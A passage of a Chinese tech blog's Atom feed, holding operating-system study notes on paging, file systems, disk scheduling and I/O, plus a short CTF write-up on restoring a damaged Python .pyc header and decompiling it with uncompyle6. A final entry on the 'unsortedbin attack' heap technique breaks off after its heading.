&lt;p&gt;1、页表机制&lt;/p&gt;
&lt;p&gt;请求分页存储的页表：&lt;/p&gt;
&lt;p&gt;内存块号 状态位 访问字段 修改位 外存地址&lt;/p&gt;
&lt;p&gt;2、缺页中断机构&lt;/p&gt;
&lt;p&gt;内中断，可被修复&lt;/p&gt;
&lt;p&gt;3、地址变换机构&lt;/p&gt;
&lt;h3 id=&#34;32_3-页面置换算法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#32_3-页面置换算法&#34;&gt;#&lt;/a&gt; 3.2_3 页面置换算法&lt;/h3&gt;
&lt;p&gt;1、最佳置换算法（OPT）&lt;/p&gt;
&lt;p&gt;每次选择淘汰的页面是以后永不使用或者在最长时间内不再被访问的页面，这样可以保证最低的缺页率。&lt;/p&gt;
&lt;p&gt;实际上不知道后面的序列&lt;/p&gt;
&lt;p&gt;2、先进先出置换算法（FIFO）&lt;/p&gt;
&lt;p&gt;每次选择淘汰的页面是最早进入内存的页面&lt;/p&gt;
&lt;p&gt;Belady 异常，当分配的内存块增大时，缺页次数反而增加&lt;/p&gt;
&lt;p&gt;3、最近最久未使用置换算法（LRU）&lt;/p&gt;
&lt;p&gt;每次淘汰最近最久未使用的页面&lt;/p&gt;
&lt;p&gt;4、时钟置换算法（最近未用算法，CLOCK）&lt;/p&gt;
&lt;p&gt;简单的：最多经历两轮扫描，初始为 1，扫一下为 0，再扫一下被踢&lt;/p&gt;
&lt;p&gt;5、改进型的时钟置换算法&lt;/p&gt;
&lt;p&gt;优先淘汰没有被修改过的，因为没有修改过的不用进行 IO 操作 00-&amp;gt;01（改）-&amp;gt;00-&amp;gt;01&lt;/p&gt;
&lt;h3 id=&#34;32_4-页面分配策略&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#32_4-页面分配策略&#34;&gt;#&lt;/a&gt; 3.2_4 页面分配策略&lt;/h3&gt;
&lt;p&gt;1、驻留集&lt;/p&gt;
&lt;p&gt;指请求分页存储管理中给进程分配的物理块的集合&lt;/p&gt;
&lt;p&gt;2、页面分配、置换策略&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;固定分配局部替换：驻留集大小不可改变&lt;/li&gt;
&lt;li&gt;可变分配全局替换：可以将操作系统保留的空闲物理块分配给缺页进程&lt;/li&gt;
&lt;li&gt;可变分配局部替换：只能选进程自己的物理块置换&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;3、调入页面的时机&lt;/p&gt;
&lt;p&gt;预调页策略：一次调用若干个相邻页面，运行前调入&lt;/p&gt;
&lt;p&gt;请求调页策略：运行时缺页再调入&lt;/p&gt;
&lt;p&gt;4、从何处调页&lt;/p&gt;
&lt;p&gt;对换区：快，采用连续分配方式&lt;/p&gt;
&lt;p&gt;文件区：慢，采用离散分配方式&lt;/p&gt;
&lt;p&gt;5、抖动（颠簸）现象&lt;/p&gt;
&lt;p&gt;刚刚换出的又要换入，刚刚换入的又要换出，物理块不够&lt;/p&gt;
&lt;p&gt;6、工作集&lt;/p&gt;
&lt;p&gt;指在某段时间间隔里，进程实际访问页面的集合&lt;/p&gt;
&lt;h3 id=&#34;41_1-初识文件管理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#41_1-初识文件管理&#34;&gt;#&lt;/a&gt; 4.1_1 初识文件管理&lt;/h3&gt;
&lt;p&gt;提供的功能：&lt;/p&gt;
&lt;p&gt;处理机管理&lt;/p&gt;
&lt;p&gt;存储器管理&lt;/p&gt;
&lt;p&gt;文件管理&lt;/p&gt;
&lt;p&gt;设备管理&lt;/p&gt;
&lt;p&gt;目标：安全高效&lt;/p&gt;
&lt;h3 id=&#34;41_2-文件的逻辑结构&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#41_2-文件的逻辑结构&#34;&gt;#&lt;/a&gt; 4.1_2 文件的逻辑结构&lt;/h3&gt;
&lt;p&gt;1、无结构文件&lt;/p&gt;
&lt;p&gt;文件由一系列二进制文件流组成&lt;/p&gt;
&lt;p&gt;2、有结构文件（记录式文件）&lt;/p&gt;
&lt;p&gt;顺序文件：文件中的记录一个接一个顺序排列，定长或变长，可以顺序存储或者链式存储&lt;/p&gt;
&lt;p&gt;按照是否与关键字顺序有关，可以分为串结构和顺序结构&lt;/p&gt;
&lt;p&gt;链式：无法随机存取&lt;/p&gt;
&lt;p&gt;顺序存储：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可变长：无法随机存取&lt;/li&gt;
&lt;li&gt;定长：可以随机存取，采用串结构，无法快速找到关键字；采用顺序结构，可以快速查找关键字&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;索引文件：索引表本身是定长的顺序文件&lt;/p&gt;
&lt;p&gt;索引顺序文件：多级索引表嵌套查找&lt;/p&gt;
&lt;h3 id=&#34;41_3-文件目录&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#41_3-文件目录&#34;&gt;#&lt;/a&gt; 4.1_3 文件目录&lt;/h3&gt;
&lt;p&gt;1、文件控制块（FCB）&lt;/p&gt;
&lt;p&gt;搜索、创建文件、删除文件、显示目录、修改目录&lt;/p&gt;
&lt;p&gt;2、目录结构&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;单级目录结构&lt;/li&gt;
&lt;li&gt;两级目录结构&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;主文件目录（MFD）+ 用户文件目录（UFD）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;多级目录结构（树形目录结构）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当代操作系统采用方法、不便于文件共享&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;无环图目录结构&lt;/p&gt;
&lt;p&gt;可以共享&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;3、索引节点（对文件控制块&lt;/p&gt;
&lt;p&gt;压缩文件名和信息&lt;/p&gt;
&lt;h3 id=&#34;41_4-文件的物理结构文件分配方式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#41_4-文件的物理结构文件分配方式&#34;&gt;#&lt;/a&gt; 4.1_4 文件的物理结构（文件分配方式）&lt;/h3&gt;
&lt;p&gt;1、对非空闲磁盘块的管理&lt;/p&gt;
&lt;p&gt;连续分配：连续分配方式要求每个文件在磁盘上占有一组连续的块，对文件的拓展不方便，有很多磁盘碎片&lt;/p&gt;
&lt;p&gt;链接分配&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;隐式分配：采用链接分配方式的文件，只支持顺序访问，不支持随机访问，方便拓展&lt;/li&gt;
&lt;li&gt;显示分配：文件分配表显式记录下一块物理块的位置，方便拓展，支持随机访问，文件表会占内存空间&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;41_4-文件的物理结构文件分配方式-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#41_4-文件的物理结构文件分配方式-2&#34;&gt;#&lt;/a&gt; 4.1_4 文件的物理结构（文件分配方式）&lt;/h3&gt;
&lt;p&gt;索引分配&lt;/p&gt;
&lt;p&gt;索引分配允许文件离散地分配在各个磁盘块中，系统会为每个文件建立一张索引表，索引表记录了文件的各个逻辑块对应的物理块&lt;/p&gt;
&lt;p&gt;支持随机访问&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;链接方案&lt;/li&gt;
&lt;li&gt;多层索引&lt;/li&gt;
&lt;li&gt;混合索引&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;41_5-文件存储空间管理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#41_5-文件存储空间管理&#34;&gt;#&lt;/a&gt; 4.1_5 文件存储空间管理&lt;/h3&gt;
&lt;p&gt;1、存储空间的划分与初始化&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;文件卷（逻辑卷）的概念&lt;/li&gt;
&lt;li&gt;目录区与文件区&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;2、几种管理方法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;空闲表法：首位置 + 长度，回收时注意修改&lt;/li&gt;
&lt;li&gt;空闲链表法（空闲盘块链、空闲盘区链）&lt;/li&gt;
&lt;li&gt;位示图法&lt;/li&gt;
&lt;li&gt;成组链接法：文件卷的目录区中专门用一个磁盘块作为超级块，当系统启动时需要将超级内存块读入内存。并且保证内存与外存中的超级块数据一致。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;41_6-文件的基本操作&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#41_6-文件的基本操作&#34;&gt;#&lt;/a&gt; 4.1_6 文件的基本操作&lt;/h3&gt;
&lt;p&gt;创建文件（create）&lt;/p&gt;
&lt;p&gt;1、在外存中找到文件所需的空间&lt;/p&gt;
&lt;p&gt;2、创建该文件对应的目录项&lt;/p&gt;
&lt;p&gt;删除文件 (delete)&lt;/p&gt;
&lt;p&gt;1、找到文件名对应的目录项&lt;/p&gt;
&lt;p&gt;2、回收文件占用的磁盘块&lt;/p&gt;
&lt;p&gt;3、删除文件对应的目录项&lt;/p&gt;
&lt;p&gt;读文件 (read)&lt;/p&gt;
&lt;p&gt;写文件 (write)&lt;/p&gt;
&lt;p&gt;打开文件 (open)&lt;/p&gt;
&lt;p&gt;1、找到文件名对应的目录项&lt;/p&gt;
&lt;p&gt;2、将目录项复制到内存中的 “打开文件” 中&lt;/p&gt;
&lt;p&gt;关闭文件 (close)&lt;/p&gt;
&lt;h3 id=&#34;41_7-文件共享&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#41_7-文件共享&#34;&gt;#&lt;/a&gt; 4.1_7 文件共享&lt;/h3&gt;
&lt;p&gt;1、基于索引结点的共享方式（硬链接）&lt;/p&gt;
&lt;p&gt;直接指向文件的索引节点&lt;/p&gt;
&lt;p&gt;2、基于符号链的共享方式（软链接）&lt;/p&gt;
&lt;p&gt;相当于 win 的快捷方式&lt;/p&gt;
&lt;h3 id=&#34;41_8-文件保护&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#41_8-文件保护&#34;&gt;#&lt;/a&gt; 4.1_8 文件保护&lt;/h3&gt;
&lt;p&gt;1、口令保护&lt;/p&gt;
&lt;p&gt;2、加密保护&lt;/p&gt;
&lt;p&gt;保密性强，不需要在系统中存储 “密码”&lt;/p&gt;
&lt;p&gt;编码 / 译码，需要花费一定时间&lt;/p&gt;
&lt;p&gt;3、访问控制&lt;br&gt;
在每个文件的 FCB 中增加一个访问控制表（ACL），该表记录了各个用户可以对该文件执行哪些操作&lt;/p&gt;
&lt;h3 id=&#34;41_9-文件系统的层次结构&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#41_9-文件系统的层次结构&#34;&gt;#&lt;/a&gt; 4.1_9 文件系统的层次结构&lt;/h3&gt;
&lt;p&gt;用户 / 应用接口&lt;/p&gt;
&lt;p&gt;用户接口&lt;/p&gt;
&lt;p&gt;文件目录系统&lt;/p&gt;
&lt;p&gt;存取控制模块&lt;/p&gt;
&lt;p&gt;逻辑文件系统与文件信息缓冲区&lt;/p&gt;
&lt;p&gt;物理文件系统&lt;/p&gt;
&lt;p&gt;辅助分配模块 设备管理模块&lt;/p&gt;
&lt;p&gt;设备&lt;/p&gt;
&lt;h3 id=&#34;42_1-磁盘的结构&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#42_1-磁盘的结构&#34;&gt;#&lt;/a&gt; 4.2_1 磁盘的结构&lt;/h3&gt;
&lt;p&gt;磁盘、磁道、扇区的概念&lt;/p&gt;
&lt;p&gt;如何在磁盘中读写数据&lt;/p&gt;
&lt;p&gt;盘面柱面的概念&lt;/p&gt;
&lt;p&gt;磁盘的物理地址&lt;/p&gt;
&lt;p&gt;磁盘的分类&lt;/p&gt;
&lt;h3 id=&#34;42_2-磁盘调度算法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#42_2-磁盘调度算法&#34;&gt;#&lt;/a&gt; 4.2_2 磁盘调度算法&lt;/h3&gt;
&lt;p&gt;1、一次磁盘读 / 写操作需要的时间&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;寻找时间 Ts=s+m*n&lt;/li&gt;
&lt;li&gt;延迟时间 Tr=1/(2r)&lt;/li&gt;
&lt;li&gt;传输时间 Tt=b/(rN)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;2、磁盘调度算法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;先来先服务（FCFS）&lt;/li&gt;
&lt;li&gt;最短寻找时间优先（SSTF）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;优先处理最近的磁道，可能会产生饥饿现象&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;扫描算法（SCAN）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;只有磁头移动到最外侧磁道的时候才能往内移动，移动到最内侧磁道的时候才能往外移动&lt;/p&gt;
&lt;p&gt;LOOK，如果在磁头移动方向上已经没有别的请求，就可以立即改变磁头移动方向&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;循环扫描算法（C-SCAN）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;返回时直接快速移动至起始端而不处理任何请求&lt;/p&gt;
&lt;p&gt;C-LOOK，如果在磁头移动方向上已经没有别的请求，就可以立即改变磁头移动方向&lt;/p&gt;
&lt;h3 id=&#34;42_3-减小磁盘延迟时间的方法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#42_3-减小磁盘延迟时间的方法&#34;&gt;#&lt;/a&gt; 4.2_3 减小磁盘延迟时间的方法&lt;/h3&gt;
&lt;p&gt;1、寻找时间（寻道时间）：启动磁臂、移动磁头所花的时间&lt;/p&gt;
&lt;p&gt;2、延迟时间：将目标扇区转到磁头下面所化的时间&lt;/p&gt;
&lt;p&gt;磁头读取一块内容后，需要一小段的时间处理&lt;/p&gt;
&lt;p&gt;采用交替编号策略&lt;/p&gt;
&lt;p&gt;柱面号在盘面号之前，可以减少磁头移动消耗的时间&lt;/p&gt;
&lt;p&gt;错位命名&lt;/p&gt;
&lt;p&gt;3、传输时间：读 / 写 数据花费的时间&lt;/p&gt;
&lt;h3 id=&#34;42_4-磁盘的管理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#42_4-磁盘的管理&#34;&gt;#&lt;/a&gt; 4.2_4 磁盘的管理&lt;/h3&gt;
&lt;p&gt;1、磁盘初始化&lt;/p&gt;
&lt;p&gt;低级格式化 / 物理分区&lt;/p&gt;
&lt;p&gt;2、引导块&lt;/p&gt;
&lt;p&gt;ROM 不可修改，ROM 中只存放很小的 “自举装入程序”&lt;/p&gt;
&lt;p&gt;3、坏块的管理&lt;/p&gt;
&lt;p&gt;在 FAT 表上标明（坏块对操作系统不透明）&lt;/p&gt;
&lt;h3 id=&#34;51_1-i-o设备的概念和分类&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#51_1-i-o设备的概念和分类&#34;&gt;#&lt;/a&gt; 5.1_1 I-O 设备的概念和分类&lt;/h3&gt;
&lt;p&gt;1、什么是 I-O 设备&lt;/p&gt;
&lt;p&gt;输入 / 输出&lt;/p&gt;
&lt;p&gt;2、按使用特性分类&lt;/p&gt;
&lt;p&gt;人机交互的外部设备&lt;/p&gt;
&lt;p&gt;存储设备&lt;/p&gt;
&lt;p&gt;网络通信设备&lt;/p&gt;
&lt;p&gt;3、按传输速率分类&lt;/p&gt;
&lt;p&gt;低俗设备、中速设备、高速设备&lt;/p&gt;
&lt;p&gt;4、按信息交换的单位分类&lt;/p&gt;
&lt;p&gt;块设备、字符设备&lt;/p&gt;
&lt;h3 id=&#34;51_2-i-o控制器&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#51_2-i-o控制器&#34;&gt;#&lt;/a&gt; 5.1_2 I-O 控制器&lt;/h3&gt;
&lt;p&gt;机械部件：鼠标等&lt;/p&gt;
&lt;p&gt;电子部件&lt;/p&gt;
&lt;p&gt;功能：&lt;/p&gt;
&lt;p&gt;1、接受和识别 CPU 发出的命令&lt;/p&gt;
&lt;p&gt;控制寄存器&lt;/p&gt;
&lt;p&gt;2、向 CPU 报告设备的状态&lt;/p&gt;
&lt;p&gt;状态寄存器&lt;/p&gt;
&lt;p&gt;3、数据交换&lt;/p&gt;
&lt;p&gt;数据寄存器&lt;/p&gt;
&lt;p&gt;4、地址识别&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;F:/Typora%E6%88%AA%E5%9B%BE/3fa359c8eb1eec40777b86bb0614bc4d.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;内存映射 IO&lt;/p&gt;
&lt;p&gt;寄存器独立编制&lt;/p&gt;
&lt;h3 id=&#34;51_3-i-o控制方式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#51_3-i-o控制方式&#34;&gt;#&lt;/a&gt; 5.1_3 I-O 控制方式&lt;/h3&gt;
&lt;p&gt;1、程序直接控制方式&lt;/p&gt;
&lt;p&gt;轮询：完成一次读 / 写操作的流程&lt;/p&gt;
&lt;p&gt;CPU 干预频繁&lt;/p&gt;
&lt;p&gt;每次读写一个字&lt;/p&gt;
&lt;p&gt;实现简单&lt;/p&gt;
&lt;p&gt;会使 CPU 忙等&lt;/p&gt;
&lt;p&gt;2、中断驱动方式&lt;/p&gt;
&lt;p&gt;让 cpu 发出 io 指令后做其它的事情&lt;/p&gt;
&lt;p&gt;大量中断会使 cpu 效率低&lt;/p&gt;
&lt;p&gt;每次读写一个字&lt;/p&gt;
&lt;p&gt;cpu 和 io 可并行工作&lt;/p&gt;
&lt;p&gt;3、DMA 方式：直接存储器存取&lt;/p&gt;
&lt;p&gt;数据单位：连续的多个块&lt;/p&gt;
&lt;p&gt;直接从设备到内存&lt;/p&gt;
&lt;p&gt;减少了 cpu 干预&lt;/p&gt;
&lt;p&gt;DR：数据寄存器&lt;/p&gt;
&lt;p&gt;MAR：内存地址寄存器&lt;/p&gt;
&lt;p&gt;DC：剩余读写字节数&lt;/p&gt;
&lt;p&gt;CR：命令 / 状态寄存器&lt;/p&gt;
&lt;p&gt;4、通道控制方式&lt;/p&gt;
&lt;p&gt;弱鸡版 cpu&lt;/p&gt;
&lt;p&gt;通道程序：任务清单&lt;/p&gt;
&lt;p&gt;cpu 发送命令给通道，然后让通道处理 IO 操作就行了&lt;/p&gt;
&lt;p&gt;处理完了，向 cpu 发送中断信号&lt;/p&gt;
&lt;h3 id=&#34;51_4-i-o软件层次结构&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#51_4-i-o软件层次结构&#34;&gt;#&lt;/a&gt; 5.1_4 I-O 软件层次结构&lt;/h3&gt;
&lt;p&gt;1、用户层软件&lt;/p&gt;
&lt;p&gt;实现与用户交互的接口，向上提供方便易用的库函数&lt;/p&gt;
&lt;p&gt;2、设备独立性软件（设备无关性软件）&lt;/p&gt;
&lt;p&gt;向上层提供统一的调用接口（read/write）&lt;/p&gt;
&lt;p&gt;设备的保护&lt;/p&gt;
&lt;p&gt;差错处理&lt;/p&gt;
&lt;p&gt;设备的分配与回收&lt;/p&gt;
&lt;p&gt;数据缓冲区管理&lt;/p&gt;
&lt;p&gt;建立逻辑设备名到物理设备名的映射关系&lt;/p&gt;
&lt;p&gt;根据设备类型选择调用相应的驱动程序&lt;/p&gt;
&lt;p&gt;3、设备驱动程序（比如打印机驱动）&lt;/p&gt;
&lt;p&gt;设置设备寄存器、检查设备状态&lt;/p&gt;
&lt;p&gt;4、中断处理程序&lt;/p&gt;
&lt;p&gt;进行中断处理&lt;/p&gt;
&lt;p&gt;5、硬件&lt;/p&gt;
&lt;p&gt;执行 IO 操作，有机械部件、电子部件组成&lt;/p&gt;
&lt;h3 id=&#34;51_5-i-o核心子系统&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#51_5-i-o核心子系统&#34;&gt;#&lt;/a&gt; 5.1_5 I-O 核心子系统&lt;/h3&gt;
&lt;p&gt;1、用户层软件&lt;/p&gt;
&lt;p&gt;假脱机系统&lt;/p&gt;
&lt;p&gt;2、设备独立性软件（设备无关性软件）&lt;/p&gt;
&lt;p&gt;IO 调度、设备保护、设备分配与回收、缓冲区管理&lt;/p&gt;
&lt;p&gt;3、设备驱动程序（比如打印机驱动）&lt;/p&gt;
&lt;p&gt;4、中断处理程序&lt;/p&gt;
&lt;p&gt;5、硬件&lt;/p&gt;
&lt;h3 id=&#34;51_6-假脱机技术&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#51_6-假脱机技术&#34;&gt;#&lt;/a&gt; 5.1_6 假脱机技术&lt;/h3&gt;
&lt;p&gt;1、什么是脱机技术，脱机技术可以解决什么问题&lt;/p&gt;
&lt;p&gt;脱离主机的控制进行输入 / 输出控制&lt;/p&gt;
&lt;p&gt;SPPOLing 系统：必须要有多道程序并发进行&lt;/p&gt;
&lt;p&gt;2、假脱机技术的实现原理&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;输入井和输出井&lt;/li&gt;
&lt;li&gt;输入进程和输出进程&lt;/li&gt;
&lt;li&gt;输入缓冲区和输出缓冲区&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;3、共享打印机的原理分析&lt;/p&gt;
&lt;h3 id=&#34;51_7-设备的分配与回收&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#51_7-设备的分配与回收&#34;&gt;#&lt;/a&gt; 5.1_7 设备的分配与回收&lt;/h3&gt;
&lt;p&gt;1、设备分配时应考虑的因素&lt;/p&gt;
&lt;p&gt;设备的固有属性：独占设备、共享设备、虚拟设备&lt;/p&gt;
&lt;p&gt;设备分配算法：&lt;/p&gt;
&lt;p&gt;设备分配中的安全：为进程分配一个设备后就将进程阻塞，本次 IO 完成后才将进程唤醒&lt;/p&gt;
&lt;p&gt;2、静态分配与动态分配&lt;/p&gt;
&lt;p&gt;静态分配：进程运行前为其分配全部所需资源、运行结束后归还资源&lt;/p&gt;
&lt;p&gt;动态分配：运行中动态分配&lt;/p&gt;
&lt;p&gt;3、设备分配管理中的数据结构&lt;/p&gt;
&lt;p&gt;树&lt;/p&gt;
&lt;p&gt;系统设备表 SDT，表目：（设备类型、设备标识符、DCT、驱动程序入口）&lt;/p&gt;
&lt;p&gt;设备控制表 DCT（设备类型、设备标识符、设备状态、指向控制器表的指针、重复执行次数或事件、设备队列的队首指针）&lt;/p&gt;
&lt;p&gt;控制器控制表 COCT（控制器标识符、控制器状态、指向通道表的指针设备队列的队首指针、控制器队列的队尾指针）&lt;/p&gt;
&lt;p&gt;通道控制表 CHCT（通道标识符、通道状态、与通道连接的控制器表首址、通道队列的队首指针、通道队列的队尾指针）&lt;/p&gt;
&lt;p&gt;4、设备分配的步骤&lt;/p&gt;
&lt;p&gt;根据进程请求的物理设备名 ——&amp;gt; 设备控制表 ——&amp;gt; 控制器控制表 ——&amp;gt; 通道&lt;/p&gt;
&lt;p&gt;5、设备分配步骤的改进方法&lt;/p&gt;
&lt;p&gt;建立逻辑设备名和设备的映射&lt;/p&gt;
&lt;h3 id=&#34;51_8-缓冲区管理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#51_8-缓冲区管理&#34;&gt;#&lt;/a&gt; 5.1_8 缓冲区管理&lt;/h3&gt;
&lt;p&gt;1、什么时缓冲区？有什么作用？&lt;/p&gt;
&lt;p&gt;缓冲区是一个存储区域&lt;/p&gt;
&lt;p&gt;缓和 CPU 与 IO 设备之间速度不匹配的矛盾&lt;/p&gt;
&lt;p&gt;减少对 CPU 的中断频率&lt;/p&gt;
&lt;p&gt;解决数据粒度不匹配的问题&lt;/p&gt;
&lt;p&gt;提高 CPU 与 IO 设备之间的并行性&lt;/p&gt;
&lt;p&gt;2、单缓冲&lt;/p&gt;
&lt;p&gt;在内存中分配一块缓冲区&lt;/p&gt;
&lt;p&gt;处理一块时间 = max（C,T)+M&lt;/p&gt;
&lt;p&gt;3、双缓冲&lt;/p&gt;
&lt;p&gt;在内存中分配两块缓冲区&lt;/p&gt;
&lt;p&gt;max(T,C+M)&lt;/p&gt;
&lt;p&gt;4、循环缓冲&lt;/p&gt;
&lt;p&gt;5、缓冲池&lt;/p&gt;
&lt;p&gt;由系统中共用的缓冲区组成。这些缓冲区可以分为：空缓冲队列、装满输入数据的缓冲队列、装满输出数据的缓冲队列&lt;/p&gt;
&lt;p&gt;转载至&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzY4NTkxNjc5L2FydGljbGUvZGV0YWlscy8xMjg3MjUwMzI/b3BzX3JlcXVlc3RfbWlzYz0lN0IlMjJyZXF1ZXN0JTVGaWQlMjIlM0ElMjIxNjg5NzcwNzc4MTY4MDAyMjI4MjE3NjUlMjIlMkMlMjJzY20lMjIlM0ElMjIyMDE0MDcxMy4xMzAxMDIzMzQuLiUyMiU3RCZhbXA7cmVxdWVzdF9pZD0xNjg5NzcwNzc4MTY4MDAyMjI4MjE3NjUmYW1wO2Jpel9pZD0wJmFtcDt1dG1fbWVkaXVtPWRpc3RyaWJ1dGUucGNfc2VhcmNoX3Jlc3VsdC5ub25lLXRhc2stYmxvZy0yfmFsbH50b3BfcG9zaXRpdmV+ZGVmYXVsdC0xLTEyODcyNTAzMi1udWxsLW51bGwuMTQyJTVFdjkwJTVFY2hhdHNlYXJjaCwyMzklNUV2MiU1RWluc2VydF9jaGF0Z3B0JmFtcDt1dG1fdGVybT1MaXR0bGVYaSZhbXA7c3BtPTEwMTguMjIyNi4zMDAxLjQxODc=&#34;&gt;) 【LittleXi】操作系统_Little Xi 的博客 - CSDN 博客&lt;/span&gt;&lt;/p&gt;
</content>
        <updated>2023-07-15T06:48:00.000Z</updated>
    </entry>
    <entry>
        <id>http://example.com/2023/05/13/pyc%E6%96%87%E4%BB%B6%E5%A4%B4%E4%BF%AE%E5%A4%8D/</id>
        <title>pyc文件头修复</title>
        <link rel="alternate" href="http://example.com/2023/05/13/pyc%E6%96%87%E4%BB%B6%E5%A4%B4%E4%BF%AE%E5%A4%8D/"/>
        <content type="html">&lt;p&gt;首先题目给了 pyc 文件为 python 37&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230513164118025.png&#34; alt=&#34;image-20230513164118025&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后 010editor 打开&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230513164147988.png&#34; alt=&#34;image-20230513164147988&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现文件头为 00  到 E3 那里都是 0  猜测文件头损坏&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;enum PycMagic &amp;#123;
    MAGIC_1_0 = 0x00999902,
    MAGIC_1_1 = 0x00999903, /* Also covers 1.2 */
    MAGIC_1_3 = 0x0A0D2E89,
    MAGIC_1_4 = 0x0A0D1704,
    MAGIC_1_5 = 0x0A0D4E99,
    MAGIC_1_6 = 0x0A0DC4FC,

    MAGIC_2_0 = 0x0A0DC687,
    MAGIC_2_1 = 0x0A0DEB2A,
    MAGIC_2_2 = 0x0A0DED2D,
    MAGIC_2_3 = 0x0A0DF23B,
    MAGIC_2_4 = 0x0A0DF26D,
    MAGIC_2_5 = 0x0A0DF2B3,
    MAGIC_2_6 = 0x0A0DF2D1,
    MAGIC_2_7 = 0x0A0DF303,

    MAGIC_3_0 = 0x0A0D0C3A,
    MAGIC_3_1 = 0x0A0D0C4E,
    MAGIC_3_2 = 0x0A0D0C6C,
    MAGIC_3_3 = 0x0A0D0C9E,
    MAGIC_3_4 = 0x0A0D0CEE,
    MAGIC_3_5 = 0x0A0D0D16,
    MAGIC_3_5_3 = 0x0A0D0D17,
    MAGIC_3_6 = 0x0A0D0D33,
    MAGIC_3_7 = 0x0A0D0D42,
    MAGIC_3_8 = 0x0A0D0D55,
    MAGIC_3_9 = 0x0A0D0D61,
&amp;#125;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这些事常用的 python 文件头  修改文件头为 MAGIC_3_7 注意小端序也就是 42 0D 0D 0A&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230513164325195.png&#34; alt=&#34;image-20230513164325195&#34;&gt;&lt;/p&gt;
&lt;p&gt;uncompyle6 -o &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3Rlc3QucHk=&#34;&gt;test.py&lt;/span&gt; 2.pyc&lt;/p&gt;
&lt;p&gt;然后使用 uncompyle6 即可成功反编译出来源码  uncompyle6 使用 pip install uncompyle6 安装&lt;/p&gt;
</content>
        <updated>2023-05-13T08:45:51.000Z</updated>
    </entry>
    <entry>
        <id>http://example.com/2023/05/11/unsorted%20bin%20attack/</id>
        <title>unsortedbin attack</title>
        <link rel="alternate" href="http://example.com/2023/05/11/unsorted%20bin%20attack/"/>
        <content type="html">&lt;h2 id=&#34;unsortedbin-attack&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#unsortedbin-attack&#34;&gt;#&lt;/a&gt; unsortedbin attack&lt;/h2&gt;
